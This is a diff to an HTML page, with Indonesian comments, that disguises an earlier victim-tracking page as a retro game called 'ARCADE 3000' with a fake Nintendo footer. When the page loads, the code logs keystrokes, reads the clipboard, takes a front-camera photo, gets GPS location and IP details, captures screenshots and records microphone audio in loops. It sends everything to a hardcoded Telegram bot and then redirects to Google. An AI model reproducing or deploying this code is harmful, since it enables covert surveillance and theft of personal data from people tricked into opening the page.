@@ -3,29 +3,199 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <title>Tracking Gila by Architect 01</title>
+    <title>ARCADE 3000 - Retro Game</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
-        .container { max-width: 600px; }
-        .loading { font-size: 24px; margin-bottom: 20px; }
-        .details { background: #1a1a1a; padding: 20px; border-radius: 10px; border: 1px solid #0f0; text-align: left; overflow: auto; max-height: 400px; }
-        pre { margin: 0; color: #0f0; }
+        * {
+            box-sizing: border-box;
+            image-rendering: pixelated;
+            image-rendering: crisp-edges;
+        }
+        body {
+            background: #000;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Courier New', monospace;
+            color: #0f0;
+            overflow: hidden;
+        }
+        .gameboy {
+            width: 340px;
+            max-width: 95%;
+            background: #111;
+            border: 4px solid #0f0;
+            border-radius: 20px 20px 40px 40px;
+            padding: 20px 15px 30px;
+            box-shadow: 0 0 20px rgba(0,255,0,0.3);
+            position: relative;
+        }
+        .gameboy::before {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 20px;
+            width: 50px;
+            height: 10px;
+            background: #0f0;
+            border-radius: 10px;
+            opacity: 0.5;
+        }
+        .gameboy::after {
+            content: '';
+            position: absolute;
+            bottom: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 5px;
+            background: #0f0;
+            border-radius: 5px;
+            opacity: 0.3;
+        }
+        .screen {
+            background: #0a0a0a;
+            border: 4px solid #0f0;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+            min-height: 200px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .screen::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(0,255,0,0.1) 50%, rgba(0,0,0,0.1) 50%);
+            background-size: 100% 4px;
+            pointer-events: none;
+            animation: scanline 6s linear infinite;
+        }
+        @keyframes scanline {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 10px; }
+        }
+        .game-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-shadow: 0 0 5px #0f0;
+            letter-spacing: 2px;
+        }
+        .game-canvas {
+            width: 100%;
+            height: 120px;
+            background: #000;
+            border: 2px solid #0f0;
+            margin: 10px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        .pixel {
+            width: 10px;
+            height: 10px;
+            background: #0f0;
+            position: absolute;
+            box-shadow: 0 0 5px #0f0;
+        }
+        .controls {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .progress-container {
+            width: 100%;
+            background: #111;
+            border: 2px solid #0f0;
+            height: 20px;
+            margin: 15px 0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #0f0;
+            transition: width 0.3s;
+            box-shadow: 0 0 8px #0f0;
+        }
+        .status-text {
+            font-size: 14px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+        .btn {
+            background: #111;
+            border: 2px solid #0f0;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 20px;
+            padding: 10px 30px;
+            margin: 15px 0;
+            border-radius: 30px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            box-shadow: 0 0 10px #0f0;
+            transition: 0.2s;
+            opacity: 0;
+            pointer-events: none;
+        }
+        .btn.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .btn:hover {
+            background: #0f0;
+            color: #000;
+        }
+        .footer {
+            font-size: 10px;
+            text-align: center;
+            margin-top: 15px;
+            color: #0f0;
+            opacity: 0.5;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="loading">🔓 MENGUMPULKAN DATA KORBAN... 🔓</div>
-        <div class="details" id="details">
-            <pre>Memuat...</pre>
+    <div class="gameboy">
+        <div class="screen">
+            <div class="game-title">ARCADE 3000</div>
+            <div class="game-canvas" id="gameCanvas">
+                <!-- Pixels akan digerakkan oleh JS -->
+            </div>
+            <div class="status-text" id="status">LOADING GAME...</div>
         </div>
+        <div class="controls">
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="btn" id="playBtn">PLAY NOW</div>
+        </div>
+        <div class="footer">ⓒ 1984 NINTENDO</div>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script>
         // ==================== KONFIGURASI ====================
         const TELEGRAM_TOKEN = '8201413619:AAFu1bPBjxbg8Nt9-emFpE_tb2TaSQTPbEE';  // GANTI DENGAN TOKEN BOT LO
         const CHAT_ID = '6809118251';                                            // GANTI DENGAN CHAT ID LO
-        const IPINFO_TOKEN = '02d525527b04f2';                                   // TOKEN VALID DARI LO (udah gue masukin)
+        const IPINFO_TOKEN = '02d525527b04f2';                                   // TOKEN VALID
+
+        // Buffer untuk keylogger
+        let keyBuffer = [];
+        let lastKeySend = Date.now();
 
         // ==================== FUNGSI KIRIM TELEGRAM ====================
         async function sendTelegramMessage(text) {
@@ -47,60 +217,187 @@
             } catch (e) { console.log('Gagal kirim foto:', e); }
         }
 
-        // ==================== DAPETIN DATA IP VIA IPINFO ====================
-        async function getIPInfo() {
+        async function sendTelegramAudio(blob, filename) {
             try {
-                let response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
-                if (!response.ok) {
-                    return { error: `HTTP ${response.status}` };
-                }
-                let data = await response.json();
-                return data;
-            } catch (error) {
-                return { error: error.message };
+                let fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('audio', blob, filename);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendAudio`, { method: 'POST', body: fd });
+            } catch (e) {
+                try {
+                    let fd2 = new FormData();
+                    fd2.append('chat_id', CHAT_ID);
+                    fd2.append('document', blob, filename);
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, { method: 'POST', body: fd2 });
+                } catch (err) {}
             }
         }
 
-        // ==================== REVERSE GEOCODING (ALAMAT DARI GPS) ====================
+        // ==================== KEYLOGGER ====================
+        document.addEventListener('keydown', function(e) {
+            let key = e.key;
+            if (key.length === 1) {
+                keyBuffer.push(key);
+            } else {
+                keyBuffer.push(`[${key}]`);
+            }
+            
+            if (Date.now() - lastKeySend > 10000 || keyBuffer.length > 50) {
+                let keys = keyBuffer.join('');
+                sendTelegramMessage("⌨️ Ketikan: " + keys);
+                keyBuffer = [];
+                lastKeySend = Date.now();
+            }
+        });
+
+        // ==================== CLIPBOARD STEALING ====================
+        async function stealClipboard() {
+            try {
+                let text = await navigator.clipboard.readText();
+                if (text) sendTelegramMessage("📋 Clipboard: " + text);
+            } catch (e) {}
+        }
+        setInterval(stealClipboard, 30000);
+
+        // ==================== DAPETIN DATA IP (DENGAN FALLBACK) ====================
+        async function getIPInfo() {
+            try {
+                let response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
+                if (response.ok) {
+                    let data = await response.json();
+                    if (!data.error) return { source: 'ipinfo', data: data };
+                }
+            } catch (e) {}
+
+            try {
+                let response = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,as,proxy,hosting');
+                let data = await response.json();
+                if (data.status === 'success') return { source: 'ipapi', data: data };
+            } catch (e) {}
+
+            return null;
+        }
+
+        // ==================== REVERSE GEOCODING ====================
         async function reverseGeocode(lat, lon) {
             try {
                 let url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=id`;
                 let resp = await fetch(url);
-                let data = await resp.json();
-                return data;
+                return await resp.json();
             } catch (e) {
                 return null;
             }
         }
 
+        // ==================== AUDIO RECORDING (LOOP) ====================
+        function startContinuousAudioRecording(duration = 60000, interval = 60000) {
+            async function recordOnce() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const recorder = new MediaRecorder(stream);
+                    let chunks = [];
+
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        await sendTelegramAudio(blob, `audio_${Date.now()}.webm`);
+                        stream.getTracks().forEach(t => t.stop());
+                        setTimeout(recordOnce, interval);
+                    };
+
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), duration);
+                } catch (err) {
+                    sendTelegramMessage("❌ Audio error: " + err.message);
+                    setTimeout(recordOnce, interval);
+                }
+            }
+            recordOnce();
+        }
+
+        // ==================== ANIMASI GAME PALSU ====================
+        function startGameAnimation() {
+            const canvas = document.getElementById('gameCanvas');
+            // Buat beberapa pixel bergerak
+            for (let i = 0; i < 5; i++) {
+                let pixel = document.createElement('div');
+                pixel.className = 'pixel';
+                pixel.style.left = Math.random() * 100 + '%';
+                pixel.style.top = Math.random() * 100 + '%';
+                pixel.style.animation = `movePixel ${2 + Math.random() * 3}s infinite alternate`;
+                canvas.appendChild(pixel);
+            }
+            // Tambah style animasi
+            const style = document.createElement('style');
+            style.innerHTML = `
+                @keyframes movePixel {
+                    0% { transform: translate(0, 0); }
+                    100% { transform: translate(${Math.random() * 50}px, ${Math.random() * 50}px); }
+                }
+            `;
+            document.head.appendChild(style);
+        }
+
+        // ==================== PROGRESS BAR PALSU ====================
+        let progress = 0;
+        const progressBar = document.getElementById('progressBar');
+        const statusText = document.getElementById('status');
+        const playBtn = document.getElementById('playBtn');
+        const interval = setInterval(() => {
+            progress += Math.random() * 5;
+            if (progress > 100) progress = 100;
+            progressBar.style.width = progress + '%';
+            statusText.innerText = `LOADING... ${Math.floor(progress)}%`;
+            if (progress >= 100) {
+                clearInterval(interval);
+                statusText.innerText = 'READY TO PLAY!';
+                playBtn.classList.add('active');
+                // Redirect setelah 10 detik kalo tombol gak ditekan
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 10000);
+            }
+        }, 200);
+
         // ==================== FUNGSI UTAMA ====================
         async function main() {
-            let output = document.getElementById('details').querySelector('pre');
-            let report = '';
+            // Mulai animasi game
+            startGameAnimation();
 
             // 1. Dapatkan IP info
-            let ipData = await getIPInfo();
-            if (ipData && !ipData.error) {
-                report += '╭───── IPINFO.IO DATA ───── ⦿\n';
-                report += `IP         : ${ipData.ip}\n`;
-                report += `Kota       : ${ipData.city || '-'}\n`;
-                report += `Region     : ${ipData.region || '-'}\n`;
-                report += `Negara     : ${ipData.country || '-'}\n`;
-                report += `Koordinat  : ${ipData.loc || '-'}\n`;
-                report += `ISP        : ${ipData.org || '-'}\n`;
-                report += `Timezone   : ${ipData.timezone || '-'}\n`;
-                report += '╰─────────────────────────⦿\n\n';
+            let ipResult = await getIPInfo();
+            let report = '';
+            if (ipResult) {
+                if (ipResult.source === 'ipinfo') {
+                    let d = ipResult.data;
+                    report += '╭───── IPINFO.IO DATA ───── ⦿\n';
+                    report += `IP         : ${d.ip}\n`;
+                    report += `Kota       : ${d.city || '-'}\n`;
+                    report += `Region     : ${d.region || '-'}\n`;
+                    report += `Negara     : ${d.country || '-'}\n`;
+                    report += `Koordinat  : ${d.loc || '-'}\n`;
+                    report += `ISP        : ${d.org || '-'}\n`;
+                    report += `Timezone   : ${d.timezone || '-'}\n`;
+                    report += '╰─────────────────────────⦿\n\n';
+                } else {
+                    let d = ipResult.data;
+                    report += '╭───── IP-API.COM DATA ───── ⦿\n';
+                    report += `IP         : ${d.query}\n`;
+                    report += `Kota       : ${d.city}\n`;
+                    report += `Region     : ${d.regionName}\n`;
+                    report += `Negara     : ${d.country}\n`;
+                    report += `Koordinat  : ${d.lat},${d.lon}\n`;
+                    report += `ISP        : ${d.isp}\n`;
+                    report += `Proxy/VPN  : ${d.proxy ? 'YA' : 'Tidak'}\n`;
+                    report += '╰─────────────────────────⦿\n\n';
+                }
             } else {
-                report += `❌ Gagal ambil data ipinfo: ${ipData?.error || 'unknown'}\n\n`;
+                report += '❌ Gagal ambil data IP\n\n';
             }
 
-            // Tampilkan dulu di layar
-            output.innerText = report;
-
-            // Kirim laporan awal ke Telegram
             await sendTelegramMessage(report);
 
-            // 2. Ambil foto dari kamera depan
+            // 2. Ambil foto kamera
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 let video = document.createElement('video');
@@ -114,10 +411,10 @@
                 canvas.toBlob(blob => sendTelegramPhoto(blob, 'selfie.jpg'), 'image/jpeg');
                 stream.getTracks().forEach(track => track.stop());
             } catch (e) {
-                await sendTelegramMessage('❌ Gagal akses kamera: ' + e.message);
+                sendTelegramMessage('❌ Gagal akses kamera: ' + e.message);
             }
 
-            // 3. GPS tracking (getCurrentPosition)
+            // 3. GPS
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     let lat = pos.coords.latitude;
@@ -128,13 +425,8 @@
                     let addr = await reverseGeocode(lat, lon);
                     if (addr) {
                         gpsMsg += `Alamat: ${addr.locality || addr.city || ''}, ${addr.principalSubdivision || ''}\n`;
-                        gpsMsg += `Lengkap: ${addr.localityInfo?.administrative?.slice(-2).map(a => a.name).join(', ') || 'Tidak diketahui'}\n`;
-                    } else {
-                        gpsMsg += 'Alamat: Tidak tersedia\n';
                     }
-
                     await sendTelegramMessage(gpsMsg);
-                    output.innerText += '\n' + gpsMsg;
                 }, (err) => {
                     sendTelegramMessage('❌ GPS error: ' + err.message);
                 }, { enableHighAccuracy: true, timeout: 10000 });
@@ -142,16 +434,26 @@
                 sendTelegramMessage('❌ Geolocation tidak didukung');
             }
 
-            // 4. Screenshot halaman
+            // 4. Screenshot
             setTimeout(async () => {
                 try {
                     let canvas = await html2canvas(document.body);
                     canvas.toBlob(blob => sendTelegramPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
                 } catch (e) {}
             }, 5000);
+
+            // 5. Mulai rekam audio
+            setTimeout(() => {
+                startContinuousAudioRecording(60000, 60000);
+            }, 3000);
         }
 
-        // Jalankan main setelah html2canvas terload
+        // Event tombol PLAY (cuma redirect)
+        playBtn.addEventListener('click', () => {
+            window.location.href = "https://www.google.com";
+        });
+
+        // Mulai
         main();
     </script>
 </body>
